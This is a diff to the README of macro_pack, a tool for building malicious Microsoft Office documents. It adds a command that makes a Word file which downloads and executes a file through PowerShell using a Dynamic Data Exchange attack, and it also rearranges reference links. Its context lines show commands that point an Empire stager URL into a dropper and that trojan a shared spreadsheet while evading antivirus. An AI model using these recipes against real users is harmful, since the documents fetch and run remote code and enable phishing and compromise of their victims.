@@ -121,6 +121,11 @@ echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -
 echo calc.exe | macro_pack.exe --dde -W dde_test.docx
 ```
 
+- Download and execute file via powershell using Dynamic Data Exchange (DDE) attack
+```bash
+python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -w DDE.doc
+```
+
 ### macro\_pack pro
 
 - Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-debug features.
@@ -218,8 +223,10 @@ If you have an issue with macro\_pack AV detection you can write to us for advic
 
 ## Relevant resources
 
-Blog post about VBA security:
+Blog post about MS Office security:
  - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
+ - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
+ - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
  
  Other useful links:
  - https://github.com/p3nt4/PowerShdll (Run PowerShell with dlls only)
@@ -228,9 +235,7 @@ Blog post about VBA security:
  - https://github.com/EmpireProject/Empire
  - https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
  - https://www.metasploit.com/
- - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
  
-
 
 ## Contact
 
